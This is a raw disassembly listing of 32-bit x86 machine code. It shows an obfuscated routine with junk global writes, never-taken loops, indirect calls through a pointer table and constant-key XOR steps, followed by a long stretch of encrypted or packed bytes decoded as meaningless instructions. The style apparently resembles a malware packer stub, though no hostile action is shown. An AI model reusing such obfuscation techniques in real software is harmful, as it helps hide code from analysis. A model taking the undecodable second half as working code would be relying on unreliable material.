  40a354:	mov    edx,DWORD PTR [ebp-0x14]
  40a357:	mov    ecx,0x7510896
  40a35c:	and    DWORD PTR ds:0x42d010,0x34d
  40a366:	xor    eax,ecx
  40a368:	sub    DWORD PTR ds:0x42a00c,0x429018
  40a372:	add    eax,0x3272dd
  40a377:	adc    DWORD PTR ds:0x42d00c,0x760b
  40a381:	mov    DWORD PTR [edx],eax
  40a383:	dec    edx
  40a384:	mov    eax,ds:0x42e2ad
  40a389:	sub    DWORD PTR ds:0x429008,ecx
  40a38f:	mov    edx,DWORD PTR [ebp-0x4]
  40a392:	mov    eax,DWORD PTR [eax]
  40a394:	and    DWORD PTR ds:0x42d004,0x42a01c
  40a39e:	add    eax,DWORD PTR [edx]
  40a3a0:	push   edi
  40a3a1:	mov    DWORD PTR [ebp-0x8],eax
  40a3a4:	and    DWORD PTR ds:0x42c008,0x0
  40a3ae:	jmp    0x40a3c0
  40a3b3:	mov    edi,DWORD PTR ds:0x42c008
  40a3b9:	inc    edi
  40a3ba:	mov    DWORD PTR ds:0x42c008,edi
  40a3c0:	cmp    DWORD PTR ds:0x42c008,0x1f
  40a3c7:	jae    0x40a451
  40a3cd:	cmp    DWORD PTR ds:0x42c008,0x25
  40a3d4:	jne    0x40a3e8
  40a3da:	push   0x3550
  40a3df:	push   DWORD PTR [ebp-0x1c]
  40a3e2:	call   DWORD PTR ds:0x42ed35
  40a3e8:	jmp    0x40a3b3
  40a3ed:	and    DWORD PTR ds:0x42d018,0x0
  40a3f7:	jmp    0x40a407
  40a3fc:	mov    eax,ds:0x42d018
  40a401:	inc    eax
  40a402:	mov    ds:0x42d018,eax
  40a407:	cmp    DWORD PTR ds:0x42d018,0x1a
  40a40e:	jae    0x40a451
  40a414:	cmp    DWORD PTR ds:0x42d018,0x8
  40a41b:	jne    0x40a434
  40a421:	push   DWORD PTR [ebp-0x1c]
  40a424:	push   0x42d014
  40a429:	push   0x5fa0
  40a42e:	call   DWORD PTR ds:0x42ed39
  40a434:	cmp    DWORD PTR ds:0x42d018,0x7
  40a43b:	jne    0x40a44c
  40a441:	mov    eax,ds:0x42d018
  40a446:	inc    eax
  40a447:	mov    ds:0x42d018,eax
  40a44c:	jmp    0x40a3fc
  40a451:	mov    edi,DWORD PTR [ebp+0x8]
  40a454:	mov    eax,ds:0x42e435
  40a459:	and    DWORD PTR ds:0x42a00c,0x728
  40a463:	mov    eax,DWORD PTR [eax+0x198]
  40a469:	xor    edi,ecx
  40a46b:	mov    edx,0x3272dd
  40a470:	and    DWORD PTR ds:0x42b010,0x42d000
  40a47a:	add    edi,edx
  40a47c:	mov    DWORD PTR ds:0x429000,0x5af1
  40a486:	cmp    DWORD PTR [eax],edi
  40a488:	je     0x40a49f
  40a48e:	mov    DWORD PTR ds:0x429000,0x225c
  40a498:	mov    eax,DWORD PTR [eax]
  40a49a:	jmp    0x40cc18
  40a49f:	mov    eax,0x3847
  40a4a4:	mov    eax,DWORD PTR [ebp+0x18]
  40a4a7:	cmp    eax,esi
  40a4a9:	mov    DWORD PTR ds:0x429014,0x6496
  40a4b3:	jne    0x40a4d7
  40a4b9:	mov    DWORD PTR ds:0x42b000,0x18c7
  40a4c3:	push   0xf89c85b2
  40a4c8:	mov    DWORD PTR ds:0x42c014,0x18
  40a4d2:	jmp    0x40cc07
  40a4d7:	mov    esi,DWORD PTR [ebp+0x18]
  40a4da:	mov    DWORD PTR ds:0x42b000,ebx
  40a4e0:	mov    eax,0xf89c85b3
  40a4e5:	cmp    esi,eax
  40a4e7:	mov    DWORD PTR ds:0x42b008,0x2007
  40a4f1:	jne    0x40cbf7
  40a4f7:	mov    eax,ds:0x42c008
  40a4fc:	xor    DWORD PTR ds:0x429004,eax
  40a502:	mov    eax,DWORD PTR [ebp+0x10]
  40a505:	dec    esi
  40a506:	xor    eax,ecx
  40a508:	adc    esi,DWORD PTR ds:0x42d008
  40a50e:	add    eax,edx
  40a510:	xor    esi,esi
  40a512:	or     esi,DWORD PTR ds:0x42c008
  40a518:	adc    DWORD PTR ds:0x42d010,esi
  40a51e:	mov    DWORD PTR [ebp-0x18],eax
  40a521:	mov    eax,DWORD PTR [ebp+0xc]
  40a524:	adc    DWORD PTR ds:0x42d010,0x3da6
  40a52e:	mov    esi,DWORD PTR [ebp-0x8]
  40a531:	xor    eax,ecx
  40a533:	add    DWORD PTR ds:0x42d018,0x6859
  40a53d:	add    eax,edx
  40a53f:	imul   eax,DWORD PTR [esi]
  40a542:	mov    esi,DWORD PTR [ebp+0x8]
  40a545:	or     DWORD PTR ds:0x42d014,0x363e
  40a54f:	xor    esi,ecx
  40a551:	mov    DWORD PTR ds:0x42b010,0xc36
  40a55b:	add    esi,edx
  40a55d:	mov    DWORD PTR ds:0x42d010,0x490b
  40a567:	cmp    esi,eax
  40a569:	mov    eax,ds:0x42d018
  40a56e:	mov    eax,DWORD PTR [ebp-0x4]
  40a571:	push   ebx
  40a572:	mov    DWORD PTR ds:0x42a008,0x30a3
  40a57c:	je     0x40a688
  40a582:	mov    DWORD PTR ds:0x42d008,0x4e69
  40a58c:	mov    esi,DWORD PTR [ebp-0x18]
  40a58f:	or     DWORD PTR ds:0x42a01c,0x42c010
  40a599:	add    DWORD PTR [eax],esi
  40a59b:	mov    DWORD PTR ds:0x42b00c,0x14
  40a5a5:	cmp    DWORD PTR ds:0x42b00c,0x0
  40a5ac:	je     0x40a5f7
  40a5b2:	cmp    DWORD PTR ds:0x42b00c,0x3
  40a5b9:	jne    0x40a5cf
  40a5bf:	push   0x42e0a1
  40a5c4:	push   0x42e035
  40a5c9:	call   DWORD PTR ds:0x42ed3d
  40a5cf:	cmp    DWORD PTR ds:0x42b00c,0x4
  40a5d6:	jne    0x40a5e7
  40a5dc:	mov    eax,ds:0x42b00c
  40a5e1:	dec    eax
  40a5e2:	mov    ds:0x42b00c,eax
  40a5e7:	mov    eax,ds:0x42b00c
  40a5ec:	dec    eax
  40a5ed:	mov    ds:0x42b00c,eax
  40a5f2:	jmp    0x40a5a5
  40a5f7:	mov    eax,DWORD PTR [ebp-0x4]
  40a5fa:	mov    DWORD PTR ds:0x42d004,0x12
  40a604:	cmp    DWORD PTR ds:0x42d004,0x0
  40a60b:	je     0x40a64f
  40a611:	cmp    DWORD PTR ds:0x42d004,0x21
  40a618:	jne    0x40a633
  40a61e:	push   0x5688
  40a623:	push   0x5318
  40a628:	push   0x314e
  40a62d:	call   DWORD PTR ds:0x42ed41
  40a633:	mov    esi,DWORD PTR ds:0x42d004
  40a639:	dec    esi
  40a63a:	mov    DWORD PTR ds:0x42d004,esi
  40a640:	jmp    0x40a604
  40a645:	sub    DWORD PTR ds:0x42c010,0x7728
  40a64f:	mov    esi,DWORD PTR [ebp+0xc]
  40a652:	add    DWORD PTR ds:0x42c018,0x42b00c
  40a65c:	xor    esi,ecx
  40a65e:	xor    DWORD PTR ds:0x429020,0x39e1
  40a668:	add    esi,edx
  40a66a:	xor    DWORD PTR ds:0x42b00c,0x429028
  40a674:	imul   esi,DWORD PTR [eax]
  40a677:	mov    DWORD PTR [eax],esi
  40a679:	mov    DWORD PTR ds:0x42d000,0x1b30
  40a683:	jmp    0x40a68f
  40a688:	and    edi,edi
  40a68a:	mov    esi,DWORD PTR [ebp+0x14]
  40a68d:	xor    DWORD PTR [eax],esi
  40a68f:	sbb    eax,edi
  40a691:	mov    eax,DWORD PTR [ebp-0x4]
  40a694:	mov    DWORD PTR ds:0x429020,0x1e
  40a69e:	cmp    DWORD PTR ds:0x429020,0x0
  40a6a5:	je     0x40a6f7
  40a6ab:	cmp    DWORD PTR ds:0x429020,0xf
  40a6b2:	jne    0x40a6cb
  40a6b8:	push   DWORD PTR [ebp-0x24]
  40a6bb:	push   0x42b000
  40a6c0:	push   0x2936
  40a6c5:	call   DWORD PTR ds:0x42ed45
  40a6cb:	cmp    DWORD PTR ds:0x429020,0x10
  40a6d2:	jne    0x40a6e5
  40a6d8:	mov    esi,DWORD PTR ds:0x429020
  40a6de:	dec    esi
  40a6df:	mov    DWORD PTR ds:0x429020,esi
  40a6e5:	mov    esi,DWORD PTR ds:0x429020
  40a6eb:	dec    esi
  40a6ec:	mov    DWORD PTR ds:0x429020,esi
  40a6f2:	jmp    0x40a69e
  40a6f7:	mov    edi,DWORD PTR [ebp+0x10]
  40a6fa:	xor    edi,ecx
  40a6fc:	mov    esi,0xffcd8d23
  40a701:	mov    ebx,esi
  40a703:	sub    ebx,edi
  40a705:	jmp    0x40caae
  40a70a:	inc    ecx
  40a70b:	sbb    al,0x8b
  40a70e:	fwait
  40a70f:	jnp    0x40a702
  40a711:	mov    BYTE PTR [ebx-0x73a83f7d],bl
  40a717:	mov    WORD PTR [edx+ecx*1+0x6d],gs
  40a71b:	add    al,0x7a
  40a71d:	jp     0x40a705
  40a71f:	pop    edi
  40a720:	jp     0x40a79c
  40a722:	adc    DWORD PTR [ecx-0x28],esi
  40a725:	scas   eax,DWORD PTR es:[edi]
  40a726:	mov    ebp,0x1194a7d0
  40a72b:	xor    eax,0x95de0381
  40a730:	fmul   DWORD PTR [ecx+0x2057971c]
  40a736:	or     DWORD PTR [edx+0x1b80f804],eax
  40a73c:	mov    eax,0x95b9ccd1
  40a741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a742:	fdivr  DWORD PTR [eax+ecx*4+0x6cf901e5]
  40a749:	sub    BYTE PTR [edx-0x61],0xb3
  40a74d:	out    0xba,al
  40a74f:	test   eax,0x73280de6
  40a754:	es adc al,0x8b
  40a757:	test   BYTE PTR [edi-0x21],0x56
  40a75b:	ins    BYTE PTR es:[edi],dx
  40a75c:	fmul   DWORD PTR [ebp+0x67]
  40a75f:	pop    ecx
  40a760:	push   esi
  40a761:	outs   dx,BYTE PTR ds:[esi]
  40a762:	pop    ebx
  40a763:	std    
  40a764:	mov    al,0x4e
  40a766:	sub    al,0x8c
  40a768:	(bad)
  40a76b:	cmp    eax,ecx
  40a76d:	stos   DWORD PTR es:[edi],eax
  40a76e:	mov    ds:0x38732c57,eax
  40a773:	retf   
  40a774:	call   0xcae6:0xb7afcacb
  40a77b:	jo     0x40a7de
  40a77d:	mov    bl,0xe7
  40a77f:	icebp  
  40a780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a781:	test   BYTE PTR [edi],ch
  40a783:	sbb    al,0xf2
  40a785:	sbb    edx,DWORD PTR [ebp+ebp*1+0x7aac7b26]
  40a78c:	test   al,0x66
  40a78e:	imul   edi,DWORD PTR [edi+ebp*2-0x6aed79ec],0x66b61e85
  40a799:	gs into 
  40a79b:	addr16 fcmovnu st,st(0)
  40a79e:	popa   
  40a79f:	mov    ds:0x7f505a90,al
  40a7a4:	xor    ebp,DWORD PTR [ecx]
  40a7a6:	cmp    ecx,DWORD PTR [eax+0x2]
  40a7a9:	cmp    DWORD PTR [ebp-0x3a],ebx
  40a7ac:	jle    0x40a754
  40a7ae:	jle    0x40a80a
  40a7b0:	xchg   edx,eax
  40a7b1:	leave  
  40a7b2:	cmp    eax,0x2cca1de2
  40a7b7:	test   BYTE PTR [edi],ah
  40a7b9:	adc    al,0x49
  40a7bb:	test   BYTE PTR [ecx-0x3e],ch
  40a7be:	in     al,0xf0
  40a7c0:	and    ebp,DWORD PTR ss:[esi-0x18]
  40a7c4:	mov    DWORD PTR [esi-0x173e5d88],esp
  40a7ca:	sub    DWORD PTR [edx],eax
  40a7cc:	mov    eax,ds:0xa00b4c40
  40a7d1:	pushf  
  40a7d2:	push   ebp
  40a7d3:	inc    edi
  40a7d4:	pop    ebx
  40a7d5:	loopne 0x40a839
  40a7d7:	xor    al,0x83
  40a7d9:	retf   0xafb2
  40a7dc:	fbstp  TBYTE PTR [edx+0x174151bf]
  40a7e2:	scas   eax,DWORD PTR es:[edi]
  40a7e3:	fcomp  DWORD PTR [esi]
  40a7e5:	nop
  40a7e6:	jno    0x40a83b
  40a7e8:	mov    DWORD PTR [edx-0x3b09d24a],esi
  40a7ee:	mov    ebp,0x763e3e8c
  40a7f3:	outs   dx,BYTE PTR ds:[esi]
  40a7f4:	dec    ecx
  40a7f5:	jno    0x40a7a3
  40a7f7:	or     BYTE PTR [ecx-0xb],0xc9
  40a7fb:	jnp    0x40a856
  40a7fd:	jmp    0x40a835
  40a7ff:	(bad)  
  40a800:	(bad)  
  40a801:	int3   
  40a802:	call   0xac643c8b
  40a807:	(bad)  
  40a808:	sbb    eax,0x742a79ba
  40a80d:	loopne 0x40a7b3
  40a80f:	stos   DWORD PTR es:[edi],eax
  40a810:	mov    BYTE PTR [edx+edi*8],ch
  40a813:	jl     0x40a82c
  40a815:	sub    BYTE PTR [ecx-0x1bce6de9],al
  40a81b:	xor    eax,0xdd71cfa8
  40a820:	dec    esi
  40a821:	(bad)  
  40a822:	cmp    DWORD PTR [ebp+eax*1-0xd28216e],ebp
  40a829:	xchg   ebp,eax
  40a82a:	mov    edx,DWORD PTR [esi]
  40a82c:	pop    esi
  40a82d:	hlt    
  40a82e:	xchg   esi,eax
  40a82f:	loope  0x40a7cd
  40a831:	(bad)  [ecx]
  40a833:	pop    edi
  40a834:	xor    eax,0x83175ff4
  40a839:	loope  0x40a821
  40a83b:	mov    al,0x33
  40a83d:	popa   
  40a83e:	les    esp,FWORD PTR [ebp+0x7ddbe786]
  40a844:	loope  0x40a82b
  40a846:	out    dx,eax
  40a847:	jnp    0x40a88d
  40a849:	adc    DWORD PTR [ebx+0xd198f26],ebx
  40a84f:	ins    BYTE PTR es:[edi],dx
  40a850:	nop
  40a851:	imul   DWORD PTR [ebx+0x281d352f]
  40a857:	and    ebp,ebp
  40a859:	(bad)  
  40a85a:	in     eax,dx
  40a85b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a85c:	push   cs
  40a85d:	jnp    0x40a85d
  40a85f:	test   eax,0x1b234c8c
  40a864:	data16 fwait
  40a866:	sbb    al,0x58
  40a868:	cmp    edx,DWORD PTR [ebp-0x7975b270]
  40a86e:	outs   dx,DWORD PTR ds:[esi]
  40a870:	mov    eax,?
  40a872:	pop    ecx
  40a873:	fdivp  st(6),st
  40a875:	mov    ds:0x70249ea6,al
  40a87a:	sub    al,0x54
  40a87c:	popf   
  40a87d:	jns    0x40a8b7
  40a87f:	dec    esi
  40a880:	add    al,0xc
  40a882:	retf   0x9489
  40a885:	pop    es
  40a886:	adc    esi,esp
  40a888:	cmp    DWORD PTR [esi+0x561ad731],ecx
  40a88e:	lea    ebx,[ebp+ebp*8-0xbaa9a30]
  40a895:	jnp    0x40a85a
  40a897:	jmp    0x40a868
  40a899:	call   DWORD PTR [ecx+ecx*2+0x62]
  40a89d:	mov    edi,DWORD PTR [edx]
  40a89f:	(bad)  
  40a8a0:	adc    BYTE PTR [ebx+0x6c],ch
  40a8a3:	ficomp DWORD PTR [ecx-0x6b]
  40a8a6:	inc    ebx
  40a8a7:	in     al,dx
  40a8a8:	test   eax,0xf99f36cb
  40a8ad:	mov    cl,0x30
  40a8af:	lods   eax,DWORD PTR ds:[si]
  40a8b1:	call   0xf7a5:0x3a2788d7
  40a8b8:	je     0x40a8cb
  40a8ba:	pop    esp
  40a8bb:	sbb    al,BYTE PTR [edi-0x1971cecb]
  40a8c1:	mov    al,al
  40a8c3:	xor    BYTE PTR [eax+0x50d51a6b],al
  40a8c9:	jmp    0x52bd:0x9b2ea6d9
  40a8d0:	adc    bh,BYTE PTR [edx+ebx*4-0x56]
  40a8d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8d5:	mov    dl,0xfb
  40a8d7:	jb     0x40a8a1
  40a8d9:	ins    BYTE PTR es:[edi],dx
  40a8da:	and    eax,0xcfc868b7
  40a8df:	or     esp,DWORD PTR [ecx+0x2343ad6f]
  40a8e5:	push   edi
  40a8e6:	out    dx,eax
  40a8e7:	outs   dx,BYTE PTR ds:[esi]
  40a8e8:	xchg   edi,eax
  40a8e9:	cmp    bh,bl
  40a8eb:	mov    DWORD PTR [ebx],eax
  40a8ed:	push   edi
  40a8ee:	inc    ebx
  40a8ef:	jp     0x40a88d
  40a8f1:	loopne 0x40a8b8
  40a8f3:	add    edi,DWORD PTR [esi]
  40a8f5:	ja     0x40a899
  40a8f7:	outs   dx,DWORD PTR ds:[esi]
  40a8f8:	mov    ecx,0x5d1535dd
  40a8fd:	cld    
  40a8fe:	push   edi
  40a8ff:	loopne 0x40a913
  40a901:	adc    dh,BYTE PTR [ebx]
  40a903:	cmc    
  40a904:	ja     0x40a937
  40a906:	sti    
  40a907:	out    0x2c,al
  40a909:	loopne 0x40a971
  40a90b:	xchg   esp,ebp
  40a90d:	imul   bh
  40a90f:	jno    0x40a8a2
  40a911:	mov    bl,0xc6
  40a913:	or     BYTE PTR [esi-0x75],bl
  40a916:	fsub   st(5),st
  40a918:	mov    ecx,0xa6b3d2f9
  40a91d:	iret   
  40a91e:	sub    BYTE PTR [eax+0x1a7014fb],0x29
  40a925:	pop    edx
  40a926:	(bad)  
  40a927:	jp     0x40a933
  40a929:	enter  0xe9e4,0xbd
  40a92d:	test   BYTE PTR [edx+0x2c],cl
  40a930:	adc    edi,DWORD PTR [ecx]
  40a932:	mov    ecx,0x9a52ba16
  40a937:	dec    edx
  40a938:	ss push 0x4
  40a93b:	mov    al,0x7
  40a93d:	je     0x40a970
  40a93f:	in     eax,0xb6
  40a941:	out    0xf4,eax
  40a943:	lds    esi,FWORD PTR [esi-0x46]
  40a946:	inc    esi
  40a947:	xor    eax,0xa5eafd5c
  40a94c:	add    eax,0xd39e5ecc
  40a951:	dec    esi
  40a952:	push   eax
  40a953:	xor    eax,esi
  40a955:	ror    DWORD PTR [edi+ebx*4+0x6970617c],1
  40a95c:	repnz mov ds:0xc8c9eadd,eax
  40a962:	mov    ah,0x94
  40a964:	jmp    0x40a981
  40a966:	test   al,0x7b
  40a968:	das    
  40a969:	add    eax,0x742680be
  40a96e:	xor    ebp,DWORD PTR [ecx]
  40a970:	fsubr  QWORD PTR [edx]
  40a972:	test   BYTE PTR [ecx+0x2],bh
  40a975:	imul   ebx,esi,0x21
  40a978:	jg     0x40a97f
  40a97a:	scas   al,BYTE PTR es:[edi]
  40a97b:	jbe    0x40a9d8
  40a97d:	leave  
  40a97e:	or     eax,0xd59e7ee1
  40a983:	dec    esi
  40a984:	cmp    edx,DWORD PTR [esi+ecx*1-0x4f4936f4]
  40a98b:	call   DWORD PTR [esi-0x53]
  40a98e:	or     ecx,DWORD PTR ds:0x4e8634c0
  40a994:	(bad)  
  40a995:	mov    eax,0xc22b9bba
  40a99a:	or     BYTE PTR [esi],0xf7
  40a99d:	fsubp  st(0),st
  40a99f:	pop    eax
  40a9a0:	mov    ds:0x3d5adcbf,al
  40a9a5:	gs ins BYTE PTR es:[edi],dx
  40a9a7:	add    cl,BYTE PTR [edx+0x76af9841]
  40a9ad:	cmp    cl,BYTE PTR ds:0xfbe57ef5
  40a9b3:	(bad)  [eax+0x6fe82a48]
  40a9b9:	and    BYTE PTR [edi-0x4c3d94e0],ch
  40a9bf:	cmc    
  40a9c0:	shl    BYTE PTR [ecx+0x22],1
  40a9c3:	lea    eax,[ebx+0x622ce85d]
  40a9c9:	stos   BYTE PTR es:[edi],al
  40a9ca:	es push ds
  40a9cc:	inc    esi
  40a9cd:	push   ds
  40a9ce:	in     al,0xf6
  40a9d0:	stos   DWORD PTR es:[edi],eax
  40a9d1:	test   BYTE PTR [ebx+0x12f4fab7],dl
  40a9d7:	push   cs
  40a9d8:	in     eax,dx
  40a9d9:	or     bh,BYTE PTR [edi+0xd]
  40a9dc:	xchg   ebp,eax
  40a9dd:	sbb    BYTE PTR [esi-0x48],dl
  40a9e0:	jle    0x40aa07
  40a9e2:	or     ch,0xb4
  40a9e5:	push   es
  40a9e6:	stos   BYTE PTR es:[edi],al
  40a9e7:	out    dx,eax
  40a9e8:	(bad)  
  40a9e9:	clc    
  40a9ea:	dec    ebx
  40a9eb:	out    dx,al
  40a9ec:	data16 in al,dx
  40a9ee:	in     al,0xab
  40a9f0:	cmp    edi,0xffffffce
  40a9f3:	mov    edi,0x3da6d4f9
  40a9f8:	push   ds
  40a9f9:	push   0x8
  40a9fb:	adc    bl,BYTE PTR [ebx-0x78e1407f]
  40aa01:	cwde   
  40aa02:	dec    edx
  40aa03:	lds    ebp,FWORD PTR [edx-0x6e64c188]
  40aa09:	and    bh,cl
  40aa0b:	es fs (bad) 
  40aa0e:	scas   eax,DWORD PTR es:[edi]
  40aa0f:	mov    bh,BYTE PTR [esp+ebx*1]
  40aa12:	das    
  40aa13:	jmp    0xe27cce95
  40aa18:	dec    edi
  40aa19:	out    0xbe,al
  40aa1b:	sub    edx,DWORD PTR [edi-0x5c]
  40aa1e:	adc    DWORD PTR [ecx],ebp
  40aa20:	pop    ss
  40aa21:	sub    dh,BYTE PTR ds:0xd5020cbd
  40aa27:	dec    ecx
  40aa28:	jns    0x40a9b2
  40aa2a:	ins    DWORD PTR es:[edi],dx
  40aa2b:	sahf   
  40aa2c:	pop    ds
  40aa2d:	in     eax,dx
  40aa2e:	push   edx
  40aa2f:	cmp    al,0x49
  40aa31:	sub    dl,BYTE PTR [eax+eiz*8]
  40aa34:	loope  0x40aa48
  40aa36:	and    BYTE PTR [esi+ebp*1],bh
  40aa39:	adc    dh,BYTE PTR [edi+0x1f]
  40aa3c:	or     DWORD PTR [edi-0x61059303],esp
  40aa42:	or     cl,BYTE PTR es:[ecx+eax*8]
  40aa46:	retf   0x2d77
  40aa49:	ret    
  40aa4a:	mov    ebp,0x993db93c
  40aa4f:	nop
  40aa50:	mov    ch,0x15
  40aa52:	mov    edi,0xdb5d29b8
  40aa57:	out    0x36,al
  40aa59:	fcmovbe st,st(3)
  40aa5b:	(bad)  
  40aa5c:	repz inc eax
  40aa5e:	add    al,0xb3
  40aa60:	std    
  40aa61:	sub    DWORD PTR [ecx],eax
  40aa63:	lods   eax,DWORD PTR ds:[esi]
  40aa64:	or     al,BYTE PTR [ebx+edi*4]
  40aa67:	enter  0xacef,0x0
  40aa6b:	xchg   esi,eax
  40aa6c:	cli    
  40aa6d:	inc    ecx
  40aa6e:	sti    
  40aa6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa70:	push   ds
  40aa71:	or     ah,cl
  40aa73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa74:	jbe    0x40aa9c
  40aa76:	or     eax,0xeb1b4a39
  40aa7b:	and    al,0xac
  40aa7d:	data16 adc cl,BYTE PTR [esi-0x63750d04]
  40aa84:	ror    DWORD PTR [eax-0x6d01f9f2],cl
  40aa8a:	xchg   edx,eax
  40aa8b:	popf   
  40aa8c:	imul   DWORD PTR [esi-0x4c]
  40aa8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa90:	xor    DWORD PTR [edx+0x5],esi
  40aa93:	push   ebx
  40aa94:	popa   
  40aa95:	sbb    BYTE PTR [edi],ah
  40aa97:	dec    eax
  40aa98:	sahf   
  40aa99:	add    al,0x69
  40aa9b:	inc    edi
  40aa9c:	adc    al,0xc7
  40aa9e:	sub    BYTE PTR ds:0x3afe794d,bl
  40aaa4:	add    al,0x37
  40aaa6:	mov    cl,BYTE PTR [edi]
  40aaa8:	sub    ebp,DWORD PTR [edx]
  40aaaa:	xor    DWORD PTR [eax+edi*4],ebx
  40aaad:	mov    ecx,0xc0123488
  40aab2:	fimul  WORD PTR [edi]
  40aab4:	jne    0x40ab0c
  40aab6:	fld    TBYTE PTR [ecx+0x13d2599e]
  40aabc:	pop    ds
  40aabd:	inc    esi
  40aabe:	mov    ch,0x6f
  40aac0:	jl     0x40aa5c
  40aac2:	fdiv   st(1),st
  40aac4:	pop    ecx
  40aac5:	add    eax,0xc7550de7
  40aaca:	sub    cl,BYTE PTR [ebx+ebx*1+0x2c]
  40aace:	das    
  40aacf:	add    eax,0x37623f03
  40aad4:	mov    bh,dl
  40aad6:	ret    
  40aad7:	scas   al,BYTE PTR es:[edi]
  40aad8:	and    BYTE PTR [esi-0x22],dl
  40aadb:	or     esi,DWORD PTR [eax+0x256db016]
  40aae1:	inc    ecx
  40aae2:	push   esp
  40aae3:	push   ebp
  40aae4:	push   0x45ebde50
  40aae9:	xchg   BYTE PTR ds:[ecx],al
  40aaec:	aas    
  40aaed:	sbb    al,0xa8
  40aaef:	jmp    0x40ab4f
  40aaf1:	mov    dl,ah
  40aaf3:	fnstcw WORD PTR ds:0xfe10fb67
  40aaf9:	mov    edx,0xc23fe31
  40aafe:	xchg   esp,eax
  40aaff:	dec    edx
  40ab00:	add    eax,DWORD PTR [ecx-0x3a]
  40ab03:	mov    dl,bl
  40ab05:	pop    eax
  40ab06:	dec    esp
  40ab07:	mov    esp,0x6d28eb57
  40ab0c:	shl    bh,1
  40ab0e:	or     eax,DWORD PTR [eax-0xf]
  40ab11:	or     edi,DWORD PTR [ebp-0xf1e9944]
  40ab17:	arpl   WORD PTR [edx+0x79],dx
  40ab1a:	sub    BYTE PTR [ecx],dh
  40ab1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab1d:	sar    BYTE PTR [eax+0x64778974],0x9d
  40ab24:	and    ah,ch
  40ab26:	scas   al,BYTE PTR es:[edi]
  40ab27:	jno    0x40aba8
  40ab29:	mov    ?,WORD PTR [ebx+ebp*2+0x5f0a1fe5]
  40ab30:	out    0x8d,al
  40ab32:	in     al,dx
  40ab33:	mov    bl,0xf0
  40ab35:	repnz clc 
  40ab37:	in     eax,0xdb
  40ab39:	cmovge esp,DWORD PTR [ecx]
  40ab3c:	cwde   
  40ab3d:	js     0x40aacc
  40ab3f:	push   ss
  40ab40:	lds    ecx,FWORD PTR [ebx-0x5d68f653]
  40ab46:	aas    
  40ab47:	jle    0x40ab30
  40ab49:	or     esp,esp
  40ab4b:	imul   ebp,DWORD PTR [esi],0x6900a964
  40ab51:	mov    edi,DWORD PTR [ebx+0x4a]
  40ab54:	fld    TBYTE PTR [edi-0xa]
  40ab57:	jne    0x40ab62
  40ab59:	push   eax
  40ab5a:	cmp    BYTE PTR [edi-0x220ddf1f],ah
  40ab60:	sbb    al,0x57
  40ab62:	sub    eax,0xbe15e4a4
  40ab67:	pop    eax
  40ab68:	shl    DWORD PTR [edi+0x44],1
  40ab6b:	pop    edx
  40ab6c:	sub    eax,DWORD PTR [ebp-0x58]
  40ab6f:	mov    edi,DWORD PTR [edx-0xc6857c8]
  40ab75:	out    0x85,al
  40ab77:	jge    0x40ab29
  40ab79:	stos   DWORD PTR es:[edi],eax
  40ab7a:	or     eax,DWORD PTR [ebx+0x480318f4]
  40ab80:	sbb    BYTE PTR [eax-0x1e57698b],ah
  40ab86:	mov    dh,0x1f
  40ab88:	dec    ebx
  40ab89:	(bad)  
  40ab8a:	ret    
  40ab8b:	add    dh,BYTE PTR [esp+ebx*1-0x11]
  40ab8f:	inc    ebx
  40ab90:	mov    esi,0x5eccf051
  40ab95:	call   0x52302083
  40ab9a:	in     eax,dx
  40ab9b:	call   0x7a99c59b
  40aba0:	leave  
  40aba1:	std    
  40aba2:	push   esp
  40aba3:	out    0xaa,al
  40aba5:	loop   0x40ab68
  40aba7:	in     al,dx
  40aba8:	scas   al,BYTE PTR es:[edi]
  40aba9:	scas   al,BYTE PTR es:[edi]
  40abaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abab:	jb     0x40ab68
  40abad:	mov    gs,WORD PTR [eax+0x6e]
  40abb0:	stos   DWORD PTR es:[edi],eax
  40abb1:	inc    esi
  40abb2:	enter  0x9b96,0x96
  40abb6:	inc    ebx
  40abb7:	addr16 xchg ebp,eax
  40abb9:	mov    eax,0x3863833f
  40abbe:	(bad)
  40abc1:	lods   eax,DWORD PTR ds:[esi]
  40abc2:	mov    esp,0x86feaaef
  40abc7:	mov    ah,0xaa
  40abc9:	sub    DWORD PTR [esi-0x55b674ad],eax
  40abcf:	mov    ebp,0x94c0e959
  40abd4:	scas   eax,DWORD PTR es:[edi]
  40abd5:	sahf   
  40abd6:	leave  
  40abd7:	es std 
  40abd9:	mov    WORD PTR [ebp+0x66],fs
  40abdc:	inc    edx
  40abdd:	bound  ebp,QWORD PTR [edx-0x5d7fdb3e]
  40abe3:	push   es
  40abe4:	xchg   edi,eax
  40abe5:	add    cl,ah
  40abe7:	pop    ebx
  40abe8:	cmp    dh,BYTE PTR [ecx+eiz*4+0x63d7ef6f]
  40abef:	pop    ds
  40abf0:	dec    esp
  40abf1:	fbld   TBYTE PTR [eax]
  40abf3:	or     al,0xa9
  40abf5:	add    al,0x30
  40abf7:	cwde   
  40abf8:	fsub   st,st(7)
  40abfa:	inc    ebx
  40abfb:	mov    eax,ds:0xf34d0ca5
  40ac00:	sub    BYTE PTR [esi],0xc5
  40ac03:	xchg   esi,eax
  40ac04:	pop    ecx
  40ac05:	scas   al,BYTE PTR es:[edi]
  40ac06:	xchg   esp,eax
  40ac07:	jnp    0x40ac2e
  40ac09:	mov    dl,0x57
  40ac0b:	mov    WORD PTR [eax],gs
  40ac0d:	ror    DWORD PTR [edx],0x16
  40ac10:	mov    ds:0xae191c54,al
  40ac15:	pop    es
  40ac16:	enter  0x8fa6,0xdb
  40ac1a:	int    0x91
  40ac1c:	pusha  
  40ac1d:	in     eax,dx
  40ac1e:	sbb    DWORD PTR [ebx-0x36760b33],ebp
  40ac24:	mov    ch,0x40
  40ac26:	jecxz  0x40ac5d
  40ac28:	stos   DWORD PTR es:[edi],eax
  40ac29:	test   BYTE PTR [edi],0x39
  40ac2c:	or     al,0x15
  40ac2e:	mov    edx,0x462f9ab
  40ac33:	out    dx,al
  40ac34:	aam    0xcf
  40ac36:	enter  0x5b67,0xf9
  40ac3a:	shr    esp,cl
